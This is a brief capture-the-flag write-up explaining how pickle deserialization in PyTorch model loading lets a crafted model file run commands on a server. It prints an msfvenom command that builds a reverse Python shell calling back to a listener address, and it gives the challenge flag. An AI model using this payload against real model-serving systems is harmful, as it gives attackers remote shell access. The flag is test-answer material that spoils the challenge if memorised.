PyTorch is infamous for its deserialization attacks. PyTorch objects are just any pickled object.

```
$ msfvenom -p cmd/unix/reverse_python LHOST=192.168.69.132 LPORT=9999 -f raw > reverse.py
```

By creating a malicious file like with solution.py's output, we can execute arbitrary commands when the model is loaded by the server.

Flag: BarSides{t0rch3d_by_p1ckl3s}